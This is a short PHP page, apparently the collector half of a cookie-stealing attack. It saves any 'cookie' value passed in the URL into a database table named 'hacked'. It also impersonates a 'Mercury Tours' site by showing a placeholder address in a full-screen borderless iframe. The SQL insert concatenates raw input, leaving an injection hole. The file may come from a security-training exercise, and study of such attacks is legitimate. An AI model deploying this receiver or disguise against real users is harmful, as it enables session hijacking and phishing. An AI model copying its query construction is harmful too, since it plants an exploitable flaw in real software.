<?php
if (isset($_GET["cookie"])){
	include "../credentials.php";
	$cookie = $_GET["cookie"] ?? '';
	$sql = "INSERT into hacked values ('$cookie');";
	mysqli_query($conn,$sql);
	//header("Location: /hacked/iframe_2.php");
}
?>
<html>
	<head>
		<title>Welcome: Mercury Tours</title>
	  <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
	</head>
	<body style="margin:0;padding:0;width:100%;height:100%;">
		<iframe id="iframe" src="http://your_ip_address" scrolling="no" style="width: 100%;height: 100%; overflow: hidden;border: none;"></iframe>
	
	</body>
</html>